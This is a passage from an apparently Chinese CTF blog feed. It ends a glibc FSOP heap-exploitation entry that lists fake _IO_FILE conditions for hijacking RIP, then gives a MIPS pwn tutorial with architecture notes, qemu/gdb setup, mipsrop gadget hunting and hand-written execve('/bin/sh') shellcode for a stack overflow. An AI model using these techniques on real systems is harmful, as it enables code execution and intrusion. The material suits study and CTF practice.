<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr;	<span class="comment">//可以绕过前面一些麻烦的操作，直奔__wunderflow</span></span><br><span class="line">(fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>)) == <span class="literal">false</span>;	<span class="comment">//mode设置为1即可</span></span><br><span class="line">_IO_in_put_mode (fp)!=<span class="number">0</span>;	<span class="comment">//即fp-&gt;flags &amp; 0x800 != 0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base;</span><br></pre></td></tr></table></figure></div>
<p>构造如下</p>
<ul>
<li><code>_flags</code> = <code>0x800</code></li>
<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> （即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>
<p>很可惜的是futureheap这道题只能申请0x700大小以下的堆块，而用largebin attack改的_IO_list_all后，第一个<code>_IO_FILE</code>结构体的<code>_flags</code>字段实质上就被赋值为largebin chunk的大小。我们就无法使<code>_IO_in_put_mode (fp)!=0</code>这个条件成立，所以本题也不好使用这一条链条。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在示例题目中，上面3种方法只有第一种方式比较方便题解，这说明了几个链条的适用条件都有所不同，可以根据具体情况选择不同的链条进行尝试。本质还是<code>_IO_flush_all_lockp</code>这个FSOP的利用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>mips_pwn</title>
    <url>/blog/2024/09/21/mips-pwn/</url>
    <content><![CDATA[<h4 id="一、mips架构概述"><a href="#一、mips架构概述" class="headerlink" title="一、mips架构概述"></a>一、mips架构概述</h4><h5 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h5><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">寄存器</th>
<th>别名</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">$0</td>
<td>$zero</td>
<td>常量0</td>
</tr>
<tr>
<td style="text-align:left">$1</td>
<td>$at</td>
<td>保留给汇编器（Assembler Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
</tr>
<tr>
<td style="text-align:left">$2-$3</td>
<td>$v0-$v1</td>
<td>用于存储函数的返回值。</td>
</tr>
<tr>
<td style="text-align:left">$4-$7</td>
<td>$a0-$a3</td>
<td>函数调用参数，用于传递最多 4 个函数参数。</td>
</tr>
<tr>
<td style="text-align:left">$8-$15</td>
<td>$t0-$t7</td>
<td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
</tr>
<tr>
<td style="text-align:left">$16-$23</td>
<td>$s0-$s7</td>
<td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
</tr>
<tr>
<td style="text-align:left">$24-$25</td>
<td>$t8-$t9</td>
<td>临时寄存器。与 <code>$t0-$t7</code> 类似，但通常不需要在函数调用中保存其值。</td>
</tr>
<tr>
<td style="text-align:left">$26-$27</td>
<td>$k0-$k1</td>
<td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
</tr>
<tr>
<td style="text-align:left">$28</td>
<td>$gp</td>
<td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
</tr>
<tr>
<td style="text-align:left">$29</td>
<td>$sp</td>
<td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
</tr>
<tr>
<td style="text-align:left">$30</td>
<td>$fp($s8)</td>
<td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
</tr>
<tr>
<td style="text-align:left">$31</td>
<td>$ra</td>
<td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
</tr>
<tr>
<td style="text-align:left">PC</td>
<td>PC</td>
<td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
</tr>
</tbody>
</table>
</div>
<p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
<h5 id="2-特征"><a href="#2-特征" class="headerlink" title="2.特征"></a>2.特征</h5><ul>
<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p>
</li>
<li><p><strong>MIPS 处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p>
</li>
<li><p>所有 MIPS 指令都具有固定的 32 位长度，这使得指令解码更加简单和高效。</p>
</li>
<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS 也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p>
</li>
<li><p>三种主要指令格式：</p>
<ul>
<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</li>
<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</li>
<li><strong>J 型</strong>：用于跳转，例如 <code>j</code>、<code>jal</code>。</li>
</ul>
</li>
<li><p>流水线操作</p>
<p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
<p>常见的MIPS芯片流水线操作分为五个阶段：</p>
<ul>
<li><strong>IF（Instruction Fetch，指令提取）</strong>：从内存中提取指令。</li>
<li><strong>ID（Instruction Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
<li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
<li><strong>MEM（Memory Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
<li><strong>WB（Write Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
</ul>
<p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
<p><strong>分支延迟槽</strong></p>
<p>MIPS架构有一个特殊的概念叫<strong>分支延迟槽</strong>。当程序遇到分支指令（如跳转指令）时，程序会跳转到新的地址去执行新指令。然而，由于流水线的设计，紧接在分支指令之后的指令已经在流水线中开始执行了。为了避免浪费，MIPS架构规定，<strong>分支后的第一条指令（即位于分支延迟槽中的指令）会在跳转之前执行</strong>。</p>
<p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0007F944    move    $t9, $s0</span><br><span class="line">.text:0007F948    jalr    $t9              </span><br><span class="line">.text:0007F94C    move    $a0, $s1</span><br></pre></td></tr></table></figure></div>
<p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p>
</li>
</ul>
<h5 id="3-指令格式"><a href="#3-指令格式" class="headerlink" title="3.指令格式"></a>3.指令格式</h5><blockquote>
<p>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。  </p>
</blockquote>
<p>32位长度分配如下</p>
<p><strong>R格式</strong>   </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>rd</td>
<td>shamt</td>
<td>funct</td>
</tr>
</tbody>
</table>
</div>
<p> 用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</p>
<p><strong>I格式</strong>      </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>16</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>立即数操作</td>
</tr>
</tbody>
</table>
</div>
<p>用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</p>
<p><strong>J格式</strong>   </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>6</th>
<th>26</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>跳转地址</td>
</tr>
</tbody>
</table>
</div>
<p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
<h5 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4.常用指令"></a>4.常用指令</h5><div class="table-container">
<table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>功能</strong></th>
<th><strong>语法</strong></th>
<th><strong>示例</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><code>add</code></strong></td>
<td>加法（有符号）</td>
<td><code>add $rd, $rs, $rt</code></td>
<td><code>add $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>addu</code></strong></td>
<td>加法（无符号）</td>
<td><code>addu $rd, $rs, $rt</code></td>
<td><code>addu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sub</code></strong></td>
<td>减法（有符号）</td>
<td><code>sub $rd, $rs, $rt</code></td>
<td><code>sub $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>subu</code></strong></td>
<td>减法（无符号）</td>
<td><code>subu $rd, $rs, $rt</code></td>
<td><code>subu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>and</code></strong></td>
<td>按位与</td>
<td><code>and $rd, $rs, $rt</code></td>
<td><code>and $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>or</code></strong></td>
<td>按位或</td>
<td><code>or $rd, $rs, $rt</code></td>
<td><code>or $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>xor</code></strong></td>
<td>按位异或</td>
<td><code>xor $rd, $rs, $rt</code></td>
<td><code>xor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>nor</code></strong></td>
<td>按位与非</td>
<td><code>nor $rd, $rs, $rt</code></td>
<td><code>nor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sll</code></strong></td>
<td>左移</td>
<td><code>sll $rd, $rt, shamt</code></td>
<td><code>sll $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>srl</code></strong></td>
<td>逻辑右移</td>
<td><code>srl $rd, $rt, shamt</code></td>
<td><code>srl $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sra</code></strong></td>
<td>算术右移</td>
<td><code>sra $rd, $rt, shamt</code></td>
<td><code>sra $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code> 中</td>
</tr>
<tr>
<td><strong><code>lw</code></strong></td>
<td>加载字（32 位）</td>
<td><code>lw $rt, offset($rs)</code></td>
<td><code>lw $t0, 4($a0)</code></td>
<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到 <code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sw</code></strong></td>
<td>存储字（32 位）</td>
<td><code>sw $rt, offset($rs)</code></td>
<td><code>sw $t0, 4($a0)</code></td>
<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code> 处。</td>
</tr>
<tr>
<td><strong><code>lb</code></strong></td>
<td>加载字节（8 位）</td>
<td><code>lb $rt, offset($rs)</code></td>
<td><code>lb $t0, 0($a0)</code></td>
<td>从地址 <code>$a0</code> 处加载 1 字节数据到 <code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sb</code></strong></td>
<td>存储字节（8 位）</td>
<td><code>sb $rt, offset($rs)</code></td>
<td><code>sb $t0, 0($a0)</code></td>
<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code> 处。</td>
</tr>
<tr>
<td><strong><code>lui</code></strong></td>
<td>加载上半字（立即数）</td>
<td><code>lui $rt, imm</code></td>
<td><code>lui $t0, 0x1234</code></td>
<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低 16 位为 0）。</td>
</tr>
<tr>
<td><strong><code>ori</code></strong></td>
<td>立即数按位或</td>
<td><code>ori $rt, $rs, imm</code></td>
<td><code>ori $t0, $t1, 0xFF</code></td>
<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>beq</code></strong></td>
<td>等于分支</td>
<td><code>beq $rs, $rt, offset</code></td>
<td><code>beq $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
</tr>
<tr>
<td><strong><code>bne</code></strong></td>
<td>不等于分支</td>
<td><code>bne $rs, $rt, offset</code></td>
<td><code>bne $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
</tr>
<tr>
<td><strong><code>j</code></strong></td>
<td>无条件跳转</td>
<td><code>j target</code></td>
<td><code>j label</code></td>
<td>跳转到 <code>label</code> 处。</td>
</tr>
<tr>
<td><strong><code>jal</code></strong></td>
<td>跳转并链接</td>
<td><code>jal target</code></td>
<td><code>jal subroutine</code></td>
<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code> 寄存器中。</td>
</tr>
<tr>
<td><strong><code>jr</code></strong></td>
<td>跳转寄存器</td>
<td><code>jr $rs</code></td>
<td><code>jr $ra</code></td>
<td>跳转到 <code>$ra</code> 寄存器中存储的地址。</td>
</tr>
<tr>
<td><strong><code>nop</code></strong></td>
<td>空操作</td>
<td><code>nop</code></td>
<td><code>nop</code></td>
<td>什么也不做，通常用于填充延迟槽。</td>
</tr>
</tbody>
</table>
</div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp</span><br></pre></td></tr></table></figure></div>
<h5 id="5-MIPS栈帧结构"><a href="#5-MIPS栈帧结构" class="headerlink" title="5.MIPS栈帧结构"></a>5.MIPS栈帧结构</h5><p>典型的MIPS栈帧结构包括以下部分：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------+ &lt;-- 栈顶（高地址）</span><br><span class="line">|  返回地址（$ra）          | 保存调用者的返回地址</span><br><span class="line">+-------------------------+</span><br><span class="line">|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）</span><br><span class="line">+-------------------------+</span><br><span class="line">|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中</span><br><span class="line">+-------------------------+</span><br><span class="line">|  局部变量                | 局部变量、临时数据等</span><br><span class="line">+-------------------------+</span><br><span class="line">|  ...                    | 其他数据</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|  栈空闲区                |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+ &lt;-- 栈底（低地址）</span><br></pre></td></tr></table></figure></div>
<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过$sp或$fp进行的。</p>
<p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
<p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
<ul>
<li><strong>叶子函数</strong>：<ul>
<li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
<li>特点<ul>
<li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
<li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
<li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
</ul>
</li>
</ul>
</li>
<li><strong>非叶子函数</strong>：<ul>
<li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
<li>特点<ul>
<li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
<li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
<li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
<p>非叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Prologue</span><br><span class="line">addiu      sp,sp,-0x60				#栈上开辟空间</span><br><span class="line">sw         ra,local_4 (sp)			#存返回地址</span><br><span class="line">sw         s8,local_8 (sp)			#存该函数的栈底</span><br><span class="line">or         s8,sp,zero</span><br><span class="line">lui        gp,0x4a</span><br><span class="line">addiu      gp,gp,-0x5d50			#设置全局变量的指针</span><br><span class="line">sw         gp=&gt;_gp ,local_50 (sp)</span><br><span class="line">...</span><br><span class="line">#Epilogue</span><br><span class="line">lw         gp,local_50 (s8)</span><br><span class="line">or         v0,zero ,zero</span><br><span class="line">or         sp,s8,zero</span><br><span class="line">lw         ra,local_4 (sp)</span><br><span class="line">lw         s8,local_8 (sp)</span><br><span class="line">addiu      sp,sp,0x60</span><br><span class="line">jr         ra</span><br><span class="line">...</span><br><span class="line">#args offered</span><br><span class="line">li         a2,0x100						#size</span><br><span class="line">addiu      v0,s8,0x18</span><br><span class="line">or         a1,v0,zero					#buf</span><br><span class="line">or         a0,zero ,zero				#fd</span><br><span class="line">lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     </span><br><span class="line">or         t9,v0,zero</span><br><span class="line">bal        read                           </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 执行函数B的任务</span><br><span class="line"># 不调用其他函数</span><br><span class="line"># 直接返回</span><br><span class="line">jr $ra</span><br></pre></td></tr></table></figure></div>
<h4 id="二、mips环境搭建"><a href="#二、mips环境搭建" class="headerlink" title="二、mips环境搭建"></a>二、mips环境搭建</h4><h5 id="1-安装qemu"><a href="#1-安装qemu" class="headerlink" title="1.安装qemu"></a>1.安装qemu</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="comment">#check if qemu existed</span></span><br><span class="line">qemu --version</span><br></pre></td></tr></table></figure></div>
<h5 id="2-安装gdb-multiarch"><a href="#2-安装gdb-multiarch" class="headerlink" title="2.安装gdb-multiarch"></a>2.安装gdb-multiarch</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br><span class="line"><span class="comment">#check if gdb-multiarch downloaded successfully</span></span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure></div>
<h5 id="3-安装ghidra"><a href="#3-安装ghidra" class="headerlink" title="3.安装ghidra"></a>3.安装ghidra</h5><p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays Decompiler插件</p>
<p>ghidra下载地址：<a class="link"   href="https://github.com/NationalSecurityAgency/ghidra/releases" >https://github.com/NationalSecurityAgency/ghidra/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>运行ghidra还需要JDK17及以上的环境</p>
<p>jdk下载地址：<a class="link"   href="https://adoptium.net/zh-CN/" >https://adoptium.net/zh-CN/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><strong>启动 Ghidra</strong>：</p>
<ul>
<li><p>Windows</p>
<ul>
<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动 Ghidra。</li>
</ul>
</li>
<li><p>Linux/macOS</p>
<ul>
<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动 Ghidra：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
</li>
</ul>
<p><strong>初次运行设置</strong>：</p>
<ul>
<li>Ghidra 启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
<li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
</ul>
<h5 id="4-安装IDA插件mipsrop"><a href="#4-安装IDA插件mipsrop" class="headerlink" title="4.安装IDA插件mipsrop"></a>4.安装IDA插件mipsrop</h5><p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/ida.git ida-plugins</span><br></pre></td></tr></table></figure></div>
<p>mipsrop.py在 ida-plugins/plugins/mipsrop目录下，将其复制进IDA的plugins目录即可</p>
<p><strong>可能遇到的问题</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180630264.png"
                      class=""
                >
<p>在ida-plugins/plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
<h5 id="5-调试方法"><a href="#5-调试方法" class="headerlink" title="5.调试方法"></a>5.调试方法</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -g 6666 -L ./ ./program		<span class="comment">#开的端口是6666</span></span><br></pre></td></tr></table></figure></div>
<p>之后用gdb连接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch program</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:6666</span><br></pre></td></tr></table></figure></div>
<p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">programe = <span class="string">&#x27;your_program&#x27;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<h4 id="三、mips的一些栈上漏洞利用"><a href="#三、mips的一些栈上漏洞利用" class="headerlink" title="三、mips的一些栈上漏洞利用"></a>三、mips的一些栈上漏洞利用</h4><p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
<h5 id="1-栈溢出-syscall"><a href="#1-栈溢出-syscall" class="headerlink" title="1.栈溢出+syscall"></a>1.栈溢出+syscall</h5><p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
<p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control jump中为jalr $fp的那个，因为$fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180732229.png"
                      class=""
                >
<p>然后既然能控制$a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到$a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180805478.png"
                      class=""
                >
<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在<a class="link"   href="https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。" >https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab		</span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的一点是execve的第一个参数最好是/bin/sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180832554.png"
                      class=""
                >
<h4 id="四、题目复现"><a href="#四、题目复现" class="headerlink" title="四、题目复现"></a>四、题目复现</h4><h5 id="xyctf2024-Ez1-0"><a href="#xyctf2024-Ez1-0" class="headerlink" title="[xyctf2024]Ez1.0"></a>[xyctf2024]Ez1.0</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180859013.png"
                      class=""
                >
<p>非常简单粗暴的栈溢出，根据上述漏洞利用原理构造即可</p>
